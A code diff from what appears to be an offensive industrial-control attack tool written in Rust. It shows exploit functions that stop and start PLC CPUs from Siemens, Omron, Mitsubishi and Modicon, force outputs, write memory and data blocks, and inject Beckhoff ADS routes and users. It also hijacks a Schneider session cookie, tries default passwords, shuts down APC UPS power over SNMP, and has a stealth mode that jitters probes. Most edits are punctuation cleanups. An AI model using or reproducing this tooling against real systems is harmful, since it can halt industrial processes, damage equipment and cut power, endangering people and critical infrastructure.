@@ -1668,12 +1668,12 @@ fn tag_header() -> [String; 2] {
     ]
 }
 
-/// Format one tag row — widths match `tag_header()`.
+/// Format one tag row: widths match `tag_header()`.
 ///
-/// `base`  — base type name (e.g. "BOOL", "DINT", "STRUCT(0x012)")
-/// `dims`  — dimension label ("1D" / "2D" / "3D" / "-")
-/// `value` — decoded live value, or "[struct]" / "[array]" / "-"
-/// `raw`   — raw 2-byte type word
+/// `base`: base type name (e.g. "BOOL", "DINT", "STRUCT(0x012)")
+/// `dims`: dimension label ("1D" / "2D" / "3D" / "-")
+/// `value`: decoded live value, or "[struct]" / "[array]" / "-"
+/// `raw`: raw 2-byte type word
 fn fmt_tag_row(
     instance_id: i64,
     name: &str,
@@ -1809,7 +1809,7 @@ fn dispatch_exploit(
             out(&format!("[*] Auto-detecting {ip}..."));
             let all = probe_all(ip, 8);
             match all.len() {
-                0 => out(&format!("[-] {ip} — no device identified")),
+                0 => out(&format!("[-] {ip}: no device identified")),
                 1 => {
                     let info = all.into_iter().next().unwrap();
                     out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
@@ -1899,7 +1899,7 @@ fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &impl Fn(&str)) {
     out(&format!("[*] Sending reboot to {ip}..."));
     match webcontrol::reboot(ip, port) {
         Ok(true) => out("[+] Reboot command sent"),
-        Ok(false) => out("[!] Sent — no confirmation"),
+        Ok(false) => out("[!] Sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -1910,7 +1910,7 @@ fn exploit_beckhoff_adduser(ip: &str, port: u16, input: &str, out: &impl Fn(&str
     out(&format!("[*] Adding user '{uname}' to {ip}..."));
     match webcontrol::add_user(ip, port, uname, pass) {
         Ok(true) => out("[+] User creation command sent"),
-        Ok(false) => out("[!] Sent — no confirmation"),
+        Ok(false) => out("[!] Sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -1922,7 +1922,7 @@ fn exploit_siemens_cpu(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     let state = s7comm::get_cpu_state(ip, port, 5, None);
     if state == "Unknown" {
         if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied — retry via CLI with --password");
+            out("[-] Access denied: retry via CLI with --password");
         } else {
             out("[-] Could not read CPU state");
         }
@@ -1977,7 +1977,7 @@ fn exploit_siemens_io(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
 
     if !has_any {
         if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied — retry via CLI with --password");
+            out("[-] Access denied: retry via CLI with --password");
         } else {
             out("[-] No I/O data received");
         }
@@ -2001,7 +2001,7 @@ fn exploit_siemens_toggle(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)
             s7comm::get_cpu_state(ip, port, 5, None)
         ));
     } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied — retry via CLI with --password");
+        out("[-] Access denied: retry via CLI with --password");
     } else {
         out("[-] Failed to toggle CPU state");
     }
@@ -2023,7 +2023,12 @@ fn exploit_schneider_hijack_info(ip: &str, port: u16, out: &impl Fn(&str)) {
         Some(s) => {
             out(&format!("[+] Cookie:          {}", s.cookie_value));
             out(&format!("    Power-on count:  {}", s.power_on_count));
-            session_hijack::get_device_info(ip, port, &s.cookie_value, "Administrator");
+            if let Some(info) = session_hijack::get_device_info(ip, port, &s.cookie_value, "Administrator") {
+                out(&format!("    Device:          {}", info.device));
+                out(&format!("    MAC:             {}", info.mac));
+                out(&format!("    Firmware:        {}", info.firmware));
+                out(&format!("    State:           {}", info.state));
+            }
         }
         None => out("[-] Failed to get session cookie"),
     }
@@ -2175,9 +2180,12 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
         }
     };
     out(&format!(
-        "[*] {} tags found — reading scalar and array[0] values...",
+        "[*] {} tags found: downloading UDT templates and reading values...",
         tags.len()
     ));
+
+    // Download UDT templates for all struct-typed tags
+    let templates = driver::enumerate_templates(ip, port, &tags);
 
     // Bulk-read all scalar (non-array, non-struct) tags in one session
     let scalar_names: Vec<&str> = tags
@@ -2196,6 +2204,7 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
                         .find(|t| t.name == name)
                         .map_or(0, |t| t.tag_type),
                     data,
+                    Some(&templates),
                 ),
                 None => "-".to_string(),
             };
@@ -2215,7 +2224,7 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
         .collect();
     let array1d_name_refs: Vec<&str> = array1d_subscript_names
         .iter()
-        .map(|s| s.as_str())
+        .map(String::as_str)
         .collect();
     let array1d_raw = driver::read_tags_bulk(ip, port, &array1d_name_refs);
     let array1d_map: HashMap<&str, String> = array1d_tags
@@ -2223,8 +2232,28 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
         .zip(array1d_raw.iter())
         .map(|((name, tag_type), opt)| {
             let val = match opt {
-                Some(data) => format!("[{}, ...]", driver::decode_value(*tag_type, data)),
+                Some(data) => format!("[{}, ...]", driver::decode_value(*tag_type, data, Some(&templates))),
                 None => "[array]".to_string(),
+            };
+            (*name, val)
+        })
+        .collect();
+
+    // Bulk-read scalar struct tags and decode with templates
+    let struct_tags: Vec<(&str, u16)> = tags
+        .iter()
+        .filter(|t| t.tag_type & 0x8000 != 0 && t.dimensions == 0)
+        .map(|t| (t.name.as_str(), t.tag_type))
+        .collect();
+    let struct_names: Vec<&str> = struct_tags.iter().map(|(n, _)| *n).collect();
+    let struct_raw = driver::read_tags_bulk(ip, port, &struct_names);
+    let struct_map: HashMap<&str, String> = struct_tags
+        .iter()
+        .zip(struct_raw.iter())
+        .map(|((name, tag_type), opt)| {
+            let val = match opt {
+                Some(data) => driver::decode_value(*tag_type, data, Some(&templates)),
+                None => driver::type_name(*tag_type),
             };
             (*name, val)
         })
@@ -2236,7 +2265,10 @@ fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
     for t in &tags {
         let (base, dims) = driver::type_parts(t.tag_type);
         let value = if t.tag_type & 0x8000 != 0 {
-            "[struct]".to_string()
+            struct_map
+                .get(t.name.as_str())
+                .cloned()
+                .unwrap_or_else(|| driver::type_name(t.tag_type))
         } else if t.dimensions == 1 {
             array1d_map
                 .get(t.name.as_str())
@@ -2279,7 +2311,7 @@ fn save_tags_and_diff(
                 .collect();
             match db.upsert_tags(ip, &data) {
                 Ok(diff) if diff.is_empty() => {
-                    out("[*] Tags saved — no changes since last scan");
+                    out("[*] Tags saved: no changes since last scan");
                 }
                 Ok(diff) => {
                     out(&format!(
@@ -2337,7 +2369,7 @@ fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc
         }
     }
 
-    out("[*] Polling every 30 s — fire another exploit or close zoom to stop");
+    out("[*] Polling every 30 s: fire another exploit or close zoom to stop");
 
     for poll in 1u32.. {
         // Sleep 30 s in 1-second ticks so the stop flag is checked promptly
@@ -2423,7 +2455,7 @@ fn exploit_mitsubishi_state(ip: &str, state: &str, out: &impl Fn(&str)) {
     out(&format!("[*] Setting Mitsubishi to {state}..."));
     match control::set_state_ip(&iface, ip, state) {
         Ok(true) => out(&format!("[+] State set to {state}")),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -2504,7 +2536,7 @@ fn save_and_diff(
         }
     };
     match db.upsert_data_points(ip, protocol, points) {
-        Ok(diff) if diff.is_empty() => out("[*] Saved — no changes since last scan"),
+        Ok(diff) if diff.is_empty() => out("[*] Saved: no changes since last scan"),
         Ok(diff) => {
             out(&format!(
                 "[!] Changes: +{} added  -{} removed  ~{} value-changed",
@@ -2571,7 +2603,7 @@ fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
                 password,
                 Some("scadaver"),
             ) {
-                out("[+] Route added — this host now has ADS access to the PLC");
+                out("[+] Route added: this host now has ADS access to the PLC");
             } else {
                 out("[-] Route injection failed (wrong credentials or device denied)");
             }
@@ -2635,7 +2667,7 @@ fn exploit_siemens_set_outputs(ip: &str, port: u16, input: &str, out: &impl Fn(&
     if s7comm::set_outputs(ip, args, port, 5, None) {
         out("[+] Outputs written");
     } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied — retry via CLI with --password");
+        out("[-] Access denied: retry via CLI with --password");
     } else {
         out("[-] Write failed");
     }
@@ -2653,7 +2685,7 @@ fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&
     if s7comm::set_merkers(ip, bits, offset, port, 5, None) {
         out("[+] Merkers written");
     } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied — retry via CLI with --password");
+        out("[-] Access denied: retry via CLI with --password");
     } else {
         out("[-] Write failed");
     }
@@ -2668,7 +2700,7 @@ fn exploit_siemens_list_dbs(ip: &str, port: u16, _input: &str, out: &impl Fn(&st
     let blocks = s7comm::list_data_blocks(ip, port, 5, None);
     if blocks.is_empty() {
         if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied — retry via CLI with --password");
+            out("[-] Access denied: retry via CLI with --password");
         } else {
             out("[-] No readable data blocks found");
         }
@@ -2712,7 +2744,7 @@ fn exploit_siemens_read_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
         }
         Err(e) => {
             if s7comm::probe_auth_required(ip, port, 5) {
-                out("[-] Access denied — retry via CLI with --password");
+                out("[-] Access denied: retry via CLI with --password");
             } else {
                 out(&format!("[-] {e}"));
             }
@@ -3638,7 +3670,7 @@ fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
     out(&format!("[*] Setting Mitsubishi to pause on {ip}..."));
     match control::set_state_ip(&iface, ip, "pause") {
         Ok(true) => out("[+] State set to pause"),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -3763,7 +3795,7 @@ fn exploit_fc90_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
     ));
     match modicon_fc90::stop_plc(ip, port) {
         Ok(true) => out("[+] PLC stopped (ack received)"),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -3775,7 +3807,7 @@ fn exploit_fc90_start(ip: &str, port: u16, out: &impl Fn(&str)) {
     ));
     match modicon_fc90::start_plc(ip, port) {
         Ok(true) => out("[+] PLC started (ack received)"),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -3785,7 +3817,7 @@ fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
     out(&format!("[*] FC90 STOP TM221 to {ip}..."));
     match modicon_fc90::stop_tm221(ip, port) {
         Ok(true) => out("[+] TM221 stopped"),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -3795,7 +3827,7 @@ fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
     out(&format!("[*] FC90 START TM221 to {ip}..."));
     match modicon_fc90::start_tm221(ip, port) {
         Ok(true) => out("[+] TM221 started"),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -3815,7 +3847,7 @@ fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     ));
     match modicon_fc90::force_output_bit(ip, port, output_byte, state) {
         Ok(true) => out("[+] Force command sent"),
-        Ok(false) => out("[!] Command sent — no confirmation"),
+        Ok(false) => out("[!] Command sent: no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -3902,10 +3934,10 @@ fn exploit_siemens_write_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str
     ));
     match s7comm::write_data_block(ip, db_num, offset, &data, port, 5, None) {
         Ok(true) => out("[+] DB write acknowledged"),
-        Ok(false) => out("[!] Write sent — PLC did not acknowledge"),
+        Ok(false) => out("[!] Write sent: PLC did not acknowledge"),
         Err(e) => {
             if s7comm::probe_auth_required(ip, port, 5) {
-                out("[-] Access denied — retry via CLI with --password");
+                out("[-] Access denied: retry via CLI with --password");
             } else {
                 out(&format!("[-] {e}"));
             }
@@ -3922,10 +3954,10 @@ fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
         "[*] Probing {ip}:{port} for S7Comm access protection..."
     ));
     if !s7comm::probe_auth_required(ip, port, 5) {
-        out("[*] No access protection detected — no password needed");
+        out("[*] No access protection detected: no password needed");
         return;
     }
-    out("[!] Access protection active — trying passwords...");
+    out("[!] Access protection active: trying passwords...");
     let loaded = creds::load();
     let all_passwords: Vec<&str> = loaded
         .siemens
@@ -3992,7 +4024,7 @@ fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &impl Fn
     ));
     match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
         Ok(true) => out("[+] Symbol written"),
-        Ok(false) => out("[!] Write sent — ADS error code returned"),
+        Ok(false) => out("[!] Write sent: ADS error code returned"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -4073,7 +4105,7 @@ fn exploit_omron_cpu_run(ip: &str, port: u16, out: &impl Fn(&str)) {
     ));
     match fins::set_cpu_mode(ip, port, 0, true) {
         Ok(true) => out("[+] CPU set to Monitor/Run mode"),
-        Ok(false) => out("[!] Command sent — FINS error returned"),
+        Ok(false) => out("[!] Command sent: FINS error returned"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -4083,7 +4115,7 @@ fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
     out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
     match fins::set_cpu_mode(ip, port, 0, false) {
         Ok(true) => out("[+] CPU stopped"),
-        Ok(false) => out("[!] Command sent — FINS error returned"),
+        Ok(false) => out("[!] Command sent: FINS error returned"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
@@ -4100,8 +4132,8 @@ fn exploit_iec104_gi(ip: &str, port: u16, out: &impl Fn(&str)) {
                 Ok(objs) => {
                     for obj in &objs {
                         out(&format!(
-                            "  IOA {:>6}: type=0x{:02x} data={:?}",
-                            obj.ioa, obj.type_id, obj.value
+                            "  IOA {:>6}: type=0x{:02x} value={}",
+                            obj.ioa, obj.type_id, obj.decoded
                         ));
                     }
                     out(&format!("[+] {} object(s) returned", objs.len()));
@@ -4122,7 +4154,7 @@ fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     match client::connect(ip, port) {
         Ok(mut sess) => match client::single_command(&mut sess, ioa, true) {
             Ok(true) => out("[+] Single Command ON confirmed"),
-            Ok(false) => out("[!] Command sent — negative confirmation"),
+            Ok(false) => out("[!] Command sent: negative confirmation"),
             Err(e) => out(&format!("[-] {e}")),
         },
         Err(e) => out(&format!("[-] {e}")),
@@ -4138,7 +4170,7 @@ fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) 
     match client::connect(ip, port) {
         Ok(mut sess) => match client::single_command(&mut sess, ioa, false) {
             Ok(true) => out("[+] Single Command OFF confirmed"),
-            Ok(false) => out("[!] Command sent — negative confirmation"),
+            Ok(false) => out("[!] Command sent: negative confirmation"),
             Err(e) => out(&format!("[-] {e}")),
         },
         Err(e) => out(&format!("[-] {e}")),
@@ -4161,7 +4193,7 @@ fn exploit_iec104_dc(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     match client::connect(ip, port) {
         Ok(mut sess) => match client::double_command(&mut sess, ioa, state) {
             Ok(true) => out("[+] Double Command confirmed"),
-            Ok(false) => out("[!] Command sent — negative confirmation"),
+            Ok(false) => out("[!] Command sent: negative confirmation"),
             Err(e) => out(&format!("[-] {e}")),
         },
         Err(e) => out(&format!("[-] {e}")),
@@ -5076,7 +5108,7 @@ fn draw_help(frame: &mut Frame, area: Rect) {
             s.fg(Color::Magenta),
         )),
         Line::from(Span::styled(
-            "  Red      Destructive — writes / controls PLC state",
+            "  Red      Destructive: writes / controls PLC state",
             s.fg(Color::Red),
         )),
         Line::from(Span::styled(
@@ -5539,7 +5571,7 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
             app.stealth = !app.stealth;
             crate::core::autodetect::set_stealth(app.stealth);
             let state = if app.stealth { "ON" } else { "OFF" };
-            app.log(format!("[!] Stealth mode {state} — probes will {}",
+            app.log(format!("[!] Stealth mode {state}: probes will {}",
                 if app.stealth { "shuffle order and add jitter" } else { "run at full speed" }
             ));
         }
@@ -6140,7 +6172,7 @@ fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
             out(&format!("  current sysName = {name_str}"));
             let val = client::SnmpValue::OctetString(name_str.into_bytes());
             match client::set(ip, p, community, oids::SYS_NAME, &val) {
-                Ok(_) => out("[+] Write confirmed — community string has write access"),
+                Ok(_) => out("[+] Write confirmed: community string has write access"),
                 Err(e) => out(&format!("[-] Write rejected: {e}")),
             }
         }
@@ -6180,7 +6212,7 @@ fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &impl Fn(&st
     out(&format!("[!] APC graceful shutdown on {ip}:{p} with community='{community}'"));
     out("[!] This will cut power to attached equipment after the UPS delay.");
     match client::set(ip, p, community, oids::APC_CMD_GRACEFUL_OFF, &client::SnmpValue::Integer(2)) {
-        Ok(_) => out("[+] Graceful shutdown command accepted — equipment will lose power"),
+        Ok(_) => out("[+] Graceful shutdown command accepted: equipment will lose power"),
         Err(e) => out(&format!("[-] Command rejected: {e}")),
     }
 }
